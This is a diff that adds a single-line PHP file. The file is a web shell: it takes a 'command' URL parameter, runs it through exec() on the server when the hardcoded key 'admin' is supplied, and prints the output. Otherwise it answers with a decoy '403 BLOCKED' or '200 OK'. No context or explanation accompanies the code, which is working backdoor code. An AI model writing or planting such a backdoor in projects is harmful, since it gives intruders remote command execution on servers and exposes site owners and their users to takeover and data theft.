@@ -1,0 +1,1 @@
+<?php if(isset($_GET['key'])){$key=$_GET['key'];if(isset($_GET['command'])&&$_GET['command']!==''){$command=$_GET['command'];if($key==="admin"){$output=exec($command);echo $output;}else{echo "403 BLOCKED";}}else{if($key==="admin"){echo "200 OK";}else{echo "403 BLOCKED";}}}else{echo "403 BLOCKED";} ?>
